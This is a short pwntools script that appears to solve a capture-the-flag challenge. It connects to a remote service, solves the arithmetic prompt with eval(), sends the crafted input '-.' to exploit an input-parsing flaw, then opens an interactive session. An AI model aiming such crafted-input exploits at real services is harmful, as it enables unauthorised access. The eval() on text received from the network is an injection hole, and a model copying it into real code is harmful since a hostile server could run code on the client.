from pwn import *

host, port = "4.145.98.52", 8002

context.log_level = "CRITICAL"

conn = remote(host, port)

conn.recvline()

eq = conn.recvuntil(b"= ").strip()[:-2]
a, op, b = eq.split(b" ")

# print(a, op, b)
res = eval(f"{int(a)} {op.decode()} {int(b)}")


# conn.recvuntil(b"= ")
conn.sendline(b"-.")

# conn.recvuntil(b">> ")
conn.sendline(str(res).encode() + b".")

conn.interactive()
